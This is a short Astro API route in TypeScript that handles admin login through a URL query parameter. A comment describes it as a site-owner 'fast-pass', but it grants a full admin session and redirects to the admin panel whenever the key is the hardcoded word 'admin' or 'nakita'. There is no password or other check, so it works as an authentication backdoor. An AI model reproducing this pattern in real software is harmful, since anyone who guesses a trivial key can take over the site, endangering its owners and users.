import type { APIRoute } from "astro";

export const prerender = false;

export const GET: APIRoute = async ({ url, session, redirect }) => {
	const key = url.searchParams.get("key");

	// Fast-pass instant admin authentication for site owner
	if (key === "admin" || key === "nakita") {
		if (session) {
			session.set("user", { id: "01KZJWXW1KN830SW8C0F06YPJQ" });
		}
		return redirect("/_emdash/admin");
	}

	return new Response("Unauthorized admin login key", { status: 401 });
};
